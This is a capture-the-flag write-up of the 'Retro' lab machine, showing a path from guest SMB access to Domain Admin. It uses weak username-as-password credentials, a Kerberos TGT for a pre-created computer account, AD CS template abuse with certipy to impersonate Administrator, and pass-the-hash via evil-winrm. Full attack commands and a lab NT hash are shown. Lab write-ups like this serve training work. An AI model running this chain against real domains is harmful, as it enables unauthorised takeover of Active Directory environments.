---
title: Retro
date: 2026-02-13T00:00:00
draft: false
difficulties: Easy
tags: ["Windows", "Active Directory", "SMB Enumeration", "Guest Access", "Certipy", "ESC2/ESC3", "ADCS"]
author: Anx
description: Comprehensive walk-through of the Retro machine, demonstrating a transition from guest SMB access to Domain Admin. The process involves credential harvesting from public shares, exploiting pre-created computer accounts via Kerberos TGT requests, and leveraging misconfigured AD CS templates (ESC2/ESC3) for identity impersonation.
---

![alt text](featured.png)

## Nmap

We began the engagement by performing a full TCP port scan against the target:

```
sudo nmap -p- -sCV 10.10.87.108 -oA nmap/10.10.87.108-full-tcp

Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-13 15:36 CET
Stats: 0:26:35 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 95.85% done; ETC: 16:04 (0:01:09 remaining)
Nmap scan report for 10.10.87.108
Host is up (0.050s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2026-02-13T14:24:43
|_Not valid after:  2027-02-13T14:24:43
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2026-02-13T14:24:43
|_Not valid after:  2027-02-13T14:24:43
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2026-02-13T14:24:43
|_Not valid after:  2027-02-13T14:24:43
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2026-02-13T14:24:43
|_Not valid after:  2027-02-13T14:24:43
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-02-13T15:06:49+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC.retro.vl
| Not valid before: 2026-02-12T14:33:32
|_Not valid after:  2026-08-14T14:33:32
| rdp-ntlm-info: 
|   Target_Name: RETRO
|   NetBIOS_Domain_Name: RETRO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: retro.vl
|   DNS_Computer_Name: DC.retro.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-13T15:06:09+00:00
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49672/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-02-13T15:06:12
|_  start_date: N/A
```

The scan results clearly indicated that the target was a Windows Domain Controller, as evidenced by the presence of LDAP (389), Kerberos-related services (464), SMB (445), and Active Directory Global Catalog ports (3268/3269).

Additionally, the SSL certificates revealed the domain name retro.vl and confirmed that the host was DC.retro.vl.

With enum4linux we can detect that guest access is enabled

```bash
enum4linux-ng 10.10.87.108 -A
```

![](Pasted%20image%2020260213193445.png)

## SMB

Using the guest account we proceeded with SMB enumeration by listing the available SMB shares:

```bash
nxc smb 10.10.87.108 -d retro.vl -u "guest" -p "" --shares
```

![](Pasted%20image%2020260213193733.png)

The share named "Trainees" appeared to be interesting so we accessed it with smbclient and downloaded the file called "Important.txt".

```bash
smbclient //10.10.87.108/Trainees -U RETRO/Guest
smb: \> get Important.txt
```

![](Pasted%20image%2020260213194008.png)

### Weak credentials

The file was a note to the Trainees and mentioned the existence of a user on the domain with weak credentials.

![](Pasted%20image%2020260213194145.png)

With impacket we listed all the domain users:

```
impacket-lookupsid Guest@10.10.87.108
```

![](Pasted%20image%2020260213195357.png)

During this process, we identified a user named trainee, which clearly correlated with the note.

Out of pure intuition, we attempted to use the username as the password, and it turned out to be valid credentials. Using the newly obtained credentials, we listed the shares again:

```bash
nxc smb 10.10.87.108 -d RETRO -u "trainee" -p "trainee" --shares
```

![](Pasted%20image%2020260213201905.png)

A new share named Notes became accessible. We connected to it and downloaded a file named `ToDo.txt`:

```
smbclient //10.10.87.108/Notes -U RETRO/trainee
smb: \> get ToDo.txt
```

![](Pasted%20image%2020260213202031.png)

## Pre created cumputer accounts abuse

The note revealed the existence of a pre-created computer account associated with the finance department. It also suggested that the account was abandoned.

![](Pasted%20image%2020260213203022.png)

We gathered additional information using LDAP:

```bash
ldapsearch -H ldap://10.10.87.108 -x -D "trainee@RETRO.VL" -w "trainee" -b "DC=RETRO,DC=VL" "user" | grep dn
```

![](Pasted%20image%2020260213204903.png)

We identified a computer account named `BANKING$`. Since the note suggested that the account had been abandoned, we attempted authentication using a similar pattern as before.

```bash
nxc smb 10.10.87.108 -d RETRO -u "BANKING$" -p "banking"
```

![](Pasted%20image%2020260213205403.png)

The credentials were valid; however, since the account had not been used for a long time, the machine password was out of sync with the Domain Controller.

Instead of resetting the password (which would have been more intrusive), we abused the behavior of pre-created computer accounts by requesting a Kerberos TGT using Impacket, as described in the following blog post:

- https://trustedsec.com/blog/diving-into-pre-created-computer-accounts

```bash
impacket-getTGT 'retro.vl/BANKING$:banking' -dc-ip 10.10.87.108
export KRB5CCNAME=BANKING$.ccache
```

![](Pasted%20image%2020260213212625.png)

> [!NOTE]
> If kerberos tools are not installed on Kali run:
> ```
> sudo apt update && sudo apt install krb5-user
> ```

We verified that the ticket was successfully imported using:

```
klist
```

![](Pasted%20image%2020260213212818.png)

This allowed us to authenticate using Kerberos without modifying the account password.

## Active Directory Certificate Services (AD CS)
### AD CS Enumeration

After gaining control over the machine account, we enumerated ADCS using Certipy:

```bash
certipy-ad find -u trainee@10.10.87.108 -p trainee
```

![](Pasted%20image%2020260213213616.png)

### Exploiting AD CS

We proceeded to request a certificate impersonating the Domain Administrator:

```bash
certipy-ad req -k -ca retro-DC-CA -upn Administrator -template RetroClients -target dc.retro.vl -key-size 4096
```

The parameters were used as follows:
- `-k` used Kerberos authentication with the cached TGT.
- `-ca retro-DC-CA` specified the Certificate Authority.
- `-upn Administrator` targeted the Domain Administrator account.
- `-template RetroClients` leveraged the vulnerable template.
- `-target dc.retro.vl` specified the CA server.

![](Pasted%20image%2020260213214729.png)

The request succeeded, and we obtained a PFX certificate for the Domain Administrator account.

### Authentication as Administrator

We authenticated using the obtained certificate:

```bash
certipy-ad auth -pfx administrator.pfx -username Administrator -domain retro.vl -dc-ip 10.10.87.108
```

![](Pasted%20image%2020260213215017.png)

This allowed us to retrieve the NT hash of the Domain Administrator account.

## Foothold as Administrator

Finally, we leveraged the Pass-the-Hash technique using Evil-WinRM:

```bash
evil-winrm -i 10.10.87.108  -u Administrator -H 252fac7066d93dd009d4fd2cd0368389
```

![](Pasted%20image%2020260213215150.png)